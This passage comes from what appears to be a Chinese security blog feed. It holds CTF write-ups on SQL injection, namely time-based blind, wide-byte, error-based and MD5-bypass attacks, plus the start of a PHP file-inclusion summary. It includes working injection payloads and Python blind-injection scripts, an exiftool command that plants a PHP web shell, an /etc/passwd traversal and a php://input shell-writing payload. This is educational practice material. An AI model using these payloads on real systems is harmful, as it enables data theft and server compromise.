('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>通过观察代码可以发现变量<code>$ip</code>可以通过更改<code>X-Forwarded-For</code>头进行更改，且后面的代码把每一次查询的ip都插入的数据库，推测<code>$ip</code>处存在注入点，于是burp抓包判断注入点：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/OZAFpjoRIb1Wyig.png" style="zoom: 50%;" /><p>利用延时注入验证此处确实存在注入点，于是开始构造注入函数，代码<code>$ip_arr = explode(&#39;,&#39;, $ip);</code>通过逗号将ip分离开，只取第一个，所以这里相当于过过滤了逗号注入符号，于是我们通常用的<code>mid</code>、<code>substr</code>，<code>if</code>判断在这里用不了了，在这里用以下注入方法替换：</p><p><code>if(sql,num,str)</code>可替换成<code>case when sql then sleep(5) else 1 end</code></p><p><code>sql</code>注入语句中的<code>substr</code>语句可以写成：<code>substr(sql from num for 1) = str</code>，将语句中的逗号替换成了<code>from</code>和<code>for</code>，语句照常进行，<code>mid</code>函数也可以这样</p><p>Payload1：<code>127.0.0.1&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>client_ip</code>,<code>flag</code></p><p>Payload2：<code>127.0.0.1&#39;and (case when (substr((select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag&#39;) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>flag</code>中的<code>flag</code>列</p><p>Payload3：<code>127.0.0.1&#39;and (case when (substr((select group_concat(flag) from flag) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到<code>flag</code>列中的<code>flag</code></p><p>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.-"</span></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = <span class="string">"此处为Payload"</span>.format(i,j)</span><br><span class="line">        header = &#123;<span class="string">"x-forwarded-for"</span>:data&#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">            print(j,end = <span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="2020ichunqiu新春公益赛—盲注"><a href="#2020ichunqiu新春公益赛—盲注" class="headerlink" title="2020ichunqiu新春公益赛—盲注"></a>2020ichunqiu新春公益赛—盲注</h3><p>首先点进去的界面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># flag在fl4g里</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'waf.php'</span>;</span><br><span class="line">    header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">    $db = <span class="keyword">new</span> mysql();</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($id) &#123;</span><br><span class="line">        <span class="keyword">if</span>(check_sql($id))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql = <span class="string">"select * from flllllllag where id=$id"</span>;</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>可以看到需要我们get一个id参数来绕过waf里的check_sql函数完成注入，并且<code>flag</code>在<code>fl4g</code>里</p><p>首先题目过滤了select，fuzz后发现以下字符和函数被过滤</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/gKbs6mkaDcpUx5W.png" style="zoom: 80%;" /><p>发现<code>sleep</code>函数并没有被过滤，于是想到延时注入，<code>=</code>、<code>like</code>、<code>rlike</code>被过滤用<code>regexp</code>函数代替</p><p>regexp后所跟的东西作为正则表达式处理。</p><p>Payload：<code>id=1 and if(ascii(mid(fl4g,1,1))regexp 102,sleep(3),1)</code></p><p>于是写出盲注注入脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://c6a55177986a42829935671bc7988fbd1a2652564f754cac.changame.ichunqiu.com/?id="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> j&lt;<span class="number">58</span> <span class="keyword">or</span> j&gt;<span class="number">96</span>:</span><br><span class="line">        <span class="comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span></span><br><span class="line">            d = <span class="string">"1 and if(ascii(mid(fl4g,"</span>+str(i)+<span class="string">",1))regexp "</span>+str(j)+<span class="string">",sleep(3),1)"</span></span><br><span class="line">            r = requests.get(url+d)</span><br><span class="line">            <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">                print(chr(j),end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="2020ichunqiu新春公益赛—easysqli-copy"><a href="#2020ichunqiu新春公益赛—easysqli-copy" class="headerlink" title="2020ichunqiu新春公益赛—easysqli_copy"></a>2020ichunqiu新春公益赛—easysqli_copy</h3><p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">参考1</a> ，<a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">参考2</a></p><p>界面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query(<span class="string">"select balabala from table1"</span>);</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(<span class="number">1</span>,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <code>$db-&gt;query(&quot;set names gbk&quot;);</code>这个语句构成了宽字节注入，即可以利用<code>%d5&#39;</code>闭合单引号形成宽字节注入，闭合单引号后后面的语句就是可控的了，所以后面只需要构造注入语句绕过waf即可，过滤的绝大多数字符，于是这里使用<code>prepare</code>预编译注入</p><p>格式：<code>set @a=执行的语句;prepare ctftest from @a; execute ctftest;</code>，该格式支持十六进制编码和ascii编码注入，于是就可以进行绕过</p><p>于是就可以用该预编译注入+延时注入+布尔盲注来爆出所有内容</p><p>爆列Payload：<code>select if(ascii(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;table1&#39;),{},1))= {},sleep(3),1)</code></p><p>爆字段payload：<code>select if(ascii(mid((select group_concat(fllllll4g,&#39;&#39;) from table1),{},1))= {},sleep(3),1)</code></p><p>写出盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8e2a5a61db69418f8ebe1c973c4bdecfa176617cfa094611.changame.ichunqiu.com/?id="</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"(This is Payload)"</span>.format(i,j)</span><br><span class="line">        payload = str_to_hex(d)</span><br><span class="line">        a = <span class="string">"%df%27;set @a=0x&#123;&#125;;prepare a from @a; execute a;"</span>.format(payload)</span><br><span class="line">        r = requests.get(url+a)</span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到<code>table1</code>表中的列：<code>balabala,eih@y,fllllll4g,bbb</code>,最终在<code>fllllll4g</code>列中得到flag</p><h3 id="安恒杯-新春祈福赛—BabySqliv2-0"><a href="#安恒杯-新春祈福赛—BabySqliv2-0" class="headerlink" title="安恒杯-新春祈福赛—BabySqliv2.0"></a>安恒杯-新春祈福赛—BabySqliv2.0</h3><p><strong>解题核心</strong>—————–异或注入，报错注入，宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/g86QP1C5ZsThjan.png" alt=""></p><p>界面的上题一样，发现只要用admin账号登录，无论用什么密码都能登录进去，登进去后界面如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200202205759631.png" alt=""></p><p>于是在登录界面测试，单引号注入无效，猜测转义了单引号，利用宽字节注入，果不其然，于是利用报错注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/4cPp1rotWQnUvew.png" alt=""></p><p>文章参考：<a href="https://www.gem-love.com/websecurity/467.html" target="_blank" rel="noopener">简析GXY_CTF “BabySqli v2.0”宽字节注入</a></p><p>报错注入有三种方法：floor()，extractvalue()，updatexml()，这里采用extractvalue()报错注入：</p><p>查库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(seselectlect(group_concat(database())))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/KDtnXxQcPvYRGV6.png" alt=""></p><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect(group_concat(table_name))from(information_schema.tables)whewherere((table_schema)=database()))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/YvlyLpUX7qZESNP.png" alt=""></p><p>由此可知flag应该在f14g中</p><p>查字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect(group_concat(column_name))from(information_schema.columns)whwhereere((table_name)=char(102,49,52,103)))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/hIfBtkgzYT4qNOa.png" alt=""></p><blockquote><p>注：这里应该是过滤了列的直接查询，用char()函数进行绕过即可</p></blockquote><p>解密MD5值后为id</p><p>id列查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect group_concat(b80bb7740288fda1f201890375a60c8f) from f14g)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/9wQR4Un3pDref1W.png" alt=""></p><p>还真全是id了，看大佬博客后发现居然还可以盲猜flag？？？</p><p>flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc</p><p>flag列查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xoZzpbPdajKuqD3.png" alt=""></p><p>base64解密后为“The first man name was k”。。。。。。。。。。</p><p>配合limit进行查询，在limit 22,1处发现flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/PXqxeEV3Hvp7cRw.png" alt=""></p><p>解码后只显示前面的flag，应该是前端界面限制了字符串的显示</p><p>于是用到substr()函数进行字符串的截取：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,substr((selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Qo3SelyJVt6qbkM.png" alt=""></p><p>去掉相同的拼合起来base64解码后即可得到flag</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="安恒杯-新春祈福赛—BabySqli"><a href="#安恒杯-新春祈福赛—BabySqli" class="headerlink" title="安恒杯-新春祈福赛—BabySqli"></a>安恒杯-新春祈福赛—BabySqli</h3><p><strong>解题核心</strong>—————–MD5绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/FUeKLit8HApfNOP.png" alt=""></p><p>题目给出的提示：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/53qyMpFJAaSEcBz-1586920617685.png" alt=""></p><p>随便登录后在前端HTML中都能看到这样一串字母</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span></span><br></pre></td></tr></table></figure><p>base32解码后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64解码后得到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure><p>sqlmap测试后可以得到admin的密码MD5值，找不到原码</p><p>于是参考MD5绕过，参考：<a href="https://www.gem-love.com/websecurity/453.html" target="_blank" rel="noopener">简析GXY_CTF “BabySqli v1.0″绕过md5比较</a></p><p>利用以下注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name: admin' And 1&gt;2 union select '1','admin','c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line">pw: 1</span><br></pre></td></tr></table></figure><blockquote><p>注：</p><blockquote><ul><li>根据得到的sql后台查询语句，需要用单引号闭合，故最后不用加单引号</li><li>union select后的查询当字符串使用需要加单引号，当然数字可以不加单引号</li><li>过滤了and可以用大写And绕过</li><li>1 的MD5值为c4ca4238a0b923820dcc509a6f75849b</li></ul></blockquote></blockquote><p>于是当前面的语句And 1&gt;2永不成立，联合查询后面的语句就会在数据库中查询显示出来</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/XHqfk2AmYUGvNyr-1586920623970.png" style="zoom:67%;" /><p>于是这时输入password=1即可绕过查询得到flag</p><h3 id="36D—WEB-你没见过的注入"><a href="#36D—WEB-你没见过的注入" class="headerlink" title="36D—WEB_你没见过的注入"></a>36D—WEB_你没见过的注入</h3><p>在<code>robots.txt</code>拿到可以直接重置管理员密码的界面<code>pwdreset.php</code>，然后再从前台登录进去，发现是一个文件上传的页面<code>main.php</code>， 界面没有做什么上传限制，但是在上传上去之后会跳转到显示文件列表的界面<code>filelist.php</code>，后台将文件名和后缀都改了，文件名应该是md5加盐后得到的一串字符串，后缀为zip文件，并且可以将文件直接下载下来，下载下来后压缩包打不开，用文本编辑器打开后里面的内容就是我们上传上去文件的内容，后台将其的名字和后缀都改了，测试绕过，无果</p><p>参考：<a href="https://www.gem-love.com/ctf/2283.html#你没见过的注入" target="_blank" rel="noopener">你没见过的注入</a></p><p>再看到文件列表显示的界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png" alt=""></p><p>除了文件名之外后面还有一串类似文件格式一样的东西，详见上面大佬的博客吧，这里给出解题步骤：</p><p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt;  <a href="https://exiftool.org/" target="_blank" rel="noopener">https://exiftool.org/</a></p><p>可以编辑图片的的<code>EXIF</code>信息</p><p>payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exiftool -overwrite_original -comment="y1ng\"');select 0x3C3F3D60245F504F53545B305D603B into outfile '/var/www/html/1.php';#" 1.jpg</span><br></pre></td></tr></table></figure><p><code>hex(&lt;?=$_POST[0];)</code>=<code>0x3C3F3D60245F504F53545B305D603B</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215714097.png" alt=""></p><p>然后直接上传到网站上去就可以拿shell了（这里png图片无效，不知道为啥）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215937088.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞小结</title>
      <link href="/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p><p>文件包含作用函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span><span class="comment">//包含过程中出现错误直接退出程序</span></span><br><span class="line"><span class="keyword">include</span>();<span class="comment">//包含过程出现错误，抛出警告，程序继续运行</span></span><br><span class="line"><span class="keyword">require_once</span>();<span class="comment">//包括require()的功能，但函数只包含一次</span></span><br><span class="line"><span class="keyword">include_once</span>();<span class="comment">//包括include()的功能，但函数只包含一次</span></span><br></pre></td></tr></table></figure><p>该函数用以加载另一个文件中的php代码，并且当php来执行</p><p>而漏洞产生的原因则是因为当函数中的参数未经过严格的过滤，且用户可控时，当用户包含了其它恶意文件代码，就导致执行了非预期操作</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>无限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315203414355.png" alt=""></p><p>可用于读取系统其它文件的内容</p><p>例如<code>2.php?a=../../../../../../../etc/passwd</code></p><p>有限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>];<span class="keyword">include</span>($a.<span class="string">".html"</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过方法：</p><p><code>%00</code>截断，条件：<code>magic_quotes_gpc</code> = <code>Off</code>，php版本&lt;<code>5.3.4</code></p><p>路径长度截断，条件：php版本&lt;<code>5.2.8</code></p><p>windows OS –&gt; 在文件后加点，点号需要长于256；linux OS –&gt; 用<code>./</code>，需长于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>无限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210218269.png" alt=""></p><p>有限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>];<span class="keyword">include</span>($a.<span class="string">".html"</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在末尾加上<code>%3f</code>，<code>%23</code>绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210124764.png" alt=""></p><h3 id="PHP支持的协议和封装协议"><a href="#PHP支持的协议和封装协议" class="headerlink" title="PHP支持的协议和封装协议"></a>PHP支持的协议和封装协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>当<code>enctype=”multipart/form-data”</code>时<code>php://input</code>无效</p><p>用法<code>?file=php://input</code>，利用POST传入</p><p>利用<code>php://input</code>写马（亦可命令执行）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要求：同时开启 <code>allow_url_fopen</code> 和 <code>allow_url_include</code>（PHP &lt; 5.3.0）即可造成任意代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img 